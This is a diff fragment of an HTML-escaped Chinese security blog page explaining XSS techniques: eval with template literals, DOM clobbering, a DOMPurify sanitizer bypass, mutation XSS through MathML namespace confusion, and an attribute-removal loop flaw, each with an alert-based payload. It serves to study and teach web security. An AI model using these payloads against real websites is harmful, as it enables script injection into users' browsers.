class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;aaa$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;bbb&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//不弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval(&amp;#x27;aaaa&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//返回[&amp;quot;aaaaaaaaa&amp;quot;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval([&amp;quot;aaaaaaaaa&amp;quot;]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//eval只能接收第一个参数的值，他只有一个参数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;[&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, raw: Array(2)]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//`&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&amp;#x27;prompt(1)&amp;#x27;,但eval不接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;prompt(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;[&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, raw: Array(2)]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//输入11111,打印11111.&amp;#123;&amp;#125;首先执行，返回([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],&amp;#x27;prompt(1)&amp;#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&amp;#x27;prompt(1)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval(&amp;#x27;prompt(1)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;11111&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;prompt(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;11111&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//输入aaaa,打印aaaa undefined.&amp;#123;&amp;#125;首先执行，返回([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],&amp;#x27;prompt(1)&amp;#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Uncaught ReferenceError: aaaa is not defined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;模板字符串中需要有表达式 ${} 才能执行 eval``&lt;/p&gt;
+&lt;p&gt;模板字符串中需要有表达式 ${} 才能执行  &lt;code&gt;eval&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回&lt;/p&gt;
 &lt;p&gt;alert 有 tostring 方法，将数字专为字符串执行&lt;/p&gt;
 &lt;p&gt;eval 没有 tostring，将数字放入数组中&lt;/p&gt;
@@ -5195,7 +5195,7 @@ include demo.jpg
 &lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;embed&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;embed&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;object&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;c&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;通过 html 影响 js&lt;/p&gt;
 &lt;p&gt;1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？&lt;/p&gt;
-&lt;p&gt;2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。&lt;/p&gt;
+&lt;p&gt;2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 &lt;code&gt;[object HTMLInputElement]&lt;/code&gt; 。&lt;/p&gt;
 &lt;p&gt;关于问题 1)&lt;/p&gt;
 &lt;p&gt;最常引用的解决方法是使用 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  标签。标记的每个 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;  都属于 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  后代，该属性 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  引用 &lt;code&gt;name&lt;/code&gt;  属性可以取到 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; 。考虑以下示例：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=test1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;input name=test2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alert(test1.test2); // alerts &amp;quot;[object HTMLInputElement]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -5228,8 +5228,8 @@ include demo.jpg
 &lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;boomer&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Ok, Boomer.&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    boomer.&lt;span class=&#34;property&#34;&gt;innerHTML&lt;/span&gt; = &lt;span class=&#34;title class_&#34;&gt;DOMPurify&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;sanitize&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;URL&lt;/span&gt;(location).&lt;span class=&#34;property&#34;&gt;searchParams&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;boomer&amp;#x27;&lt;/span&gt;) || &lt;span class=&#34;string&#34;&gt;&amp;quot;Ok, Boomer&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;setTimeout&lt;/span&gt;(ok, &lt;span class=&#34;number&#34;&gt;2000&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框&lt;/p&gt;
 &lt;p&gt;可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量&lt;/p&gt;
-&lt;p&gt;首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如&lt;div id=&#34;ok&#34;&gt;&lt;/div&gt;&lt;/p&gt;
-&lt;p&gt;然后，ok 需要接受一个字符串作为值，而在对&lt;a&gt;标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择&lt;a&gt;标签作为构造对象&lt;/p&gt;
+&lt;p&gt;首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如 &lt;code&gt;&amp;lt;div id=&amp;quot;ok&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后，ok 需要接受一个字符串作为值，而在对 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;  标签调用 toString () 方法时，会返回属性 &lt;code&gt;href&lt;/code&gt;  的值，所以，我们可以选择 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;  标签作为构造对象&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?boomer=&amp;lt;a id=ok href=cid:alert(1337)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的&lt;/p&gt;
 &lt;p&gt;通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可&lt;/p&gt;
@@ -5321,7 +5321,7 @@ include demo.jpg
 &lt;li&gt;&lt;code&gt;svg title&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的&lt;/p&gt;
-&lt;p&gt;html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了&lt;mglyph&gt;&lt;malignmark&gt;。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。&lt;/p&gt;
+&lt;p&gt;html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了 &lt;code&gt;&amp;lt;mglyph&amp;gt;&amp;lt;malignmark&amp;gt;&lt;/code&gt; 。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;最终 payload1:&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form&amp;gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -5370,7 +5370,7 @@ include demo.jpg
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div id=&amp;quot;notify&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;div class=&amp;quot;alert alert-warning&amp;quot; role=&amp;quot;alert&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;b&amp;gt;Meme&amp;lt;/b&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		created from &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;img name=&amp;quot;notify&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;style&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;lt;script&amp;gt;alert()//&amp;lt;/style&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;h2 id=&#34;svg深入研究&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#svg深入研究&#34;&gt;#&lt;/a&gt; &amp;lt;svg&amp;gt; 深入研究&lt;/h2&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;data&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;decodeURIComponent&lt;/span&gt;(location.hash.&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;root&lt;/span&gt; = document.&lt;span class=&#34;title function_ invoke__&#34;&gt;createElement&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;div&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.innerHTML = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let el of root.&lt;span class=&#34;title function_ invoke__&#34;&gt;querySelectorAll&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let attr of el.attributes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         el.&lt;span class=&#34;title function_ invoke__&#34;&gt;removeAttribute&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.body.&lt;span class=&#34;title function_ invoke__&#34;&gt;appendChild&lt;/span&gt;(root)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;HTML5 中 innerHtml 不执行插入的&lt;script&gt;标签&lt;/p&gt;
+&lt;p&gt;HTML5 中 innerHtml 不执行插入的 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;exp:  &lt;code&gt;&amp;lt;img a src=&#39;a&#39; b onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;因此我们一般不在同一个数组边循环边删除&lt;/p&gt;
